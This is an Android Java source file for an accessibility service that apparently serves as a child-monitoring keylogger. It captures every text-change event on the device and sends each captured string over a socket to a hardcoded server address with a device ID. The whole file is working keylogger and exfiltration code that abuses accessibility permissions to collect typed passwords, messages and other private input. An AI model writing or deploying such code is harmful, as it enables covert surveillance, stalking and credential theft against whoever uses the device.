package com.xyz.child;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import java.io.PrintWriter;

public class KeylogAccessibilityService extends AccessibilityService {
    private static final String SERVER_HOST = "192.168.39.161";
    private static final int SERVER_PORT = 7100;
    private static final String DEVICE_ID = "child_device_001";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String text = event.getText().toString();
            Log.i("Keylog", "Captured: " + text);
            sendKeylog(text);
        }
    }

    private void sendKeylog(String text) {
        new Thread(() -> {
            try {
                SSLSocketFactory factory = (SSLSocketFactory) SSLSocketFactory.getDefault();
                SSLSocket socket = (SSLSocket) factory.createSocket(SERVER_HOST, SERVER_PORT);
                PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                out.println(DEVICE_ID + ":keylog:" + text);
                socket.close();
                Log.i("Keylog", "Sent keylog: " + text);
            } catch (Exception e) {
                Log.e("Keylog", "Error sending keylog: " + e.getMessage(), e);
            }
        }).start();
    }

    @Override
    public void onInterrupt() {}
}
